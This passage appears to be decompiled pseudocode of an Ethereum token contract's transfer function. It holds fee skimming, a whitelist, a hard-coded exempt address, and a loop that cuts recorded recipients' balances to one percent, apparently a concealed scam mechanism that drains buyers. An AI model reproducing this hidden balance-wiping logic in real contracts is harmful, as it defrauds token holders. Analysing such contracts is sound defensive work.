                                    require ext_code.size(address(ext_call.return_data[0]))
                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                            gas gas_remaining wei
                                           args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    if ext_call.return_data[12 len 20] == arg1:
                                        if arg2 < arg2 * _fee / 100:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[0] += arg2 * _fee / 100
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 - (arg2 * _fee / 100),
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      arg1,
                                        if arg2 * _fee / 100 > 0:
                                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                                          arg2 * _fee / 100,
                                                          mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                          msg.sender,
                                                          0,
                                        return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                    stor15.length++
                                    stor15[stor15.length].field_0 = arg1
                                    stor15[stor15.length].field_256 = arg2
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100 > 0:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                return 1, mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)]
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0])
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if stor6[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if stor6[address(arg1)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if arg1 == this.address:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if ext_call.return_data[12 len 20] != msg.sender:
                            if msg.sender == address(ext_call.return_data[0]):
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                        else:
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                        if stor14:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if not arg2:
                            require arg2 <= _maxTxAmount
                            require ext_code.size(stor16)
                            staticcall stor16.factory() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(stor16)
                            staticcall stor16.WETH() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            mem[(15 * ceil32(return_data.size)) + 268] = this.address
                            mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                            require ext_code.size(address(ext_call.return_data[0]))
                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            if ext_call.return_data[12 len 20] == arg1:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                            stor15.length++
                            stor15[stor15.length].field_0 = arg1
                            stor15[stor15.length].field_256 = arg2
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                        else:
                            if arg2 and _fee > -1 / arg2:
                                revert with 'NH{q', 17
                            if not arg2:
                                revert with 'NH{q', 18
                            if arg2 * _fee / arg2 != _fee:
                                revert with 0, 'SafeMath: multiplication overflow'
                            require arg2 <= _maxTxAmount
                            require ext_code.size(stor16)
                            staticcall stor16.factory() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(stor16)
                            staticcall stor16.WETH() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            mem[(15 * ceil32(return_data.size)) + 268] = this.address
                            mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                            require ext_code.size(address(ext_call.return_data[0]))
                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            if ext_call.return_data[12 len 20] == arg1:
                                if arg2 < arg2 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100 > 0:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                                return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                            stor15.length++
                            stor15[stor15.length].field_0 = arg1
                            stor15[stor15.length].field_256 = arg2
                            if arg2 < arg2 * _fee / 100:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100 > 0:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                        return 1, mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)]
                    idx = 0
                    while idx < stor15.length:
                        mem[0] = stor15[idx].field_0
                        mem[32] = 3
                        _647 = mem[64]
                        mem[64] = mem[64] + 64
                        mem[_647] = 26
                        mem[_647 + 32] = 'SafeMath: division by zero'
                        if idx >= stor15.length:
                            revert with 'NH{q', 50
                        mem[0] = stor15[idx].field_0
                        mem[32] = 3
                        balanceOf[stor15[idx].field_0] = balanceOf[stor15[idx].field_0] / 100
                        if idx == -1:
                            revert with 'NH{q', 17
                        idx = idx + 1
                        continue 
                    stor15.length = 0
                    mem[0] = 15
                    idx = 0
                    while 2 * stor15.length > idx:
                        stor15[idx].field_0 = 0
                        stor15[idx].field_256 = 0
                        idx = idx + 2
                        continue 
                    require ext_code.size(stor16)
                    staticcall stor16.factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7011 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7021 = mem[_7011]
                    require mem[_7011] == mem[_7011 + 12 len 20]
                    require ext_code.size(stor16)
                    staticcall stor16.WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7039 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7045 = mem[_7039]
                    require mem[_7039] == mem[_7039 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_7045)
                    require ext_code.size(address(_7021))
                    staticcall address(_7021).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_7045)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7063 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    require mem[_7063] == mem[_7063 + 12 len 20]
                    if arg1 != mem[_7063 + 12 len 20]:
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7117 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7135 = mem[_7117]
                        require mem[_7117] == mem[_7117 + 12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7183 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7213 = mem[_7183]
                        require mem[_7183] == mem[_7183 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_7213)
                        require ext_code.size(address(_7135))
                        staticcall address(_7135).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_7213)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7371 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7441 = mem[_7371]
                        require mem[_7371] == mem[_7371 + 12 len 20]
                        if mem[_7371 + 12 len 20] != msg.sender:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 6
                                if stor6[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7807 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7807 + 32 len mem[_7807]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_7441):
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor14:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 6
                                if stor6[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7839 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7839 + 32 len mem[_7839]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor6[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor14:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
